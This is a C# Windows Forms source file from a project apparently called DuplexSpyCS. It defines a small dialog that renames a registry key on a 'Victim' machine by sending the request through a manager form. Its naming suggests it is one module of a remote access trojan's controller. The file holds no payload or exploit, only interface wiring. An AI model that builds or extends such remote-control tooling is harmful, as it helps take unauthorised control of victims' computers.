using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmRegKeyRename : Form
    {
        public frmManager f_mgr;

        public Victim v;

        public string currentPath;
        public string keyName;

        public frmRegKeyRename()
        {
            InitializeComponent();
        }

        void setup()
        {
            textBox1.Text = keyName;
            textBox1.ReadOnly = true;
        }

        private void frmRegKeyRename_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string srcPath = currentPath + "\\" + textBox1.Text;
            string dstPath = currentPath + "\\" + textBox2.Text;

            f_mgr.Reg_ReqKeyRename(currentPath, srcPath, dstPath);
        }
    }
}
